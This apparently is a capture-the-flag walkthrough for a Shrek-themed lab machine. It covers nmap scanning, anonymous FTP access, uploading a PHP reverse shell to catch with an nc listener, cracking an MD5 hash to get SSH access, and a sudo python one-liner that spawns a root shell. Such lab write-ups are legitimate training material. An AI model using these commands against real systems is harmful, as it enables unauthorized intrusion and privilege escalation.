We start with a scan: **nmap -A -sC ip**
We see an Apache server and an FTP server. It is possible to enter ftp with **user anonymous**, without a password.
![nmap](images/1)

Going to the Browser *http://ip_target* we see a default Apache page, there is a comment in the source code.
![browser](images/2)

Using **gobuster**, we discovered a hidden directory, with a file called CALL.txt
![gobuster](images/3)

Now we will go to *FTP*
![ftp, anonymous](images/4)

With **ls -la** we see that we can * write to the FTP directory * and that it is the same folder where the CALL.txt file is located.
We can use /usr/share/webshells/php/php-reverse-shell.php
We just need to change the ip and port before uploading to FTP

![php-reverse-shell](images/5)

We will send php-reverse-shell.php to the victim via ftp -> ** put xx/php-reverse-shell.php **
![put_php-reverse-shell](images/6)

Let's open ¹**nc -lnvp 1234** by listening and go to the ?browser to open ³php-reverse-shell.php
![nc](images/7)
![browser](images/8)
![conexão](images/9)

We found the 1st flag in /home/shrek/user.txt
![flag1](images/10)
In / home, we see an important.txt file, pointing to "/.runme.sh"
![runme.sh](images/11)

Analyzing ¹hash, it is an MD5, we see that it is possibly the credential for ²SSH and also the secret key
https://www.tunnelsup.com/hash-analyzer/
https://crackstation.net/

![shrek:hash](images/12)
![ssh](images/13)

By providing sudo -l, we can run python with sudo without a password. Going to https://gtfobins.github.io/gtfobins/python/#sudo, we see a way to get a privileged shell.

![sudo-l](images/14)
'''
sudo python -c 'import os; os.system("/bin/sh")'
'''

![root](images/15)


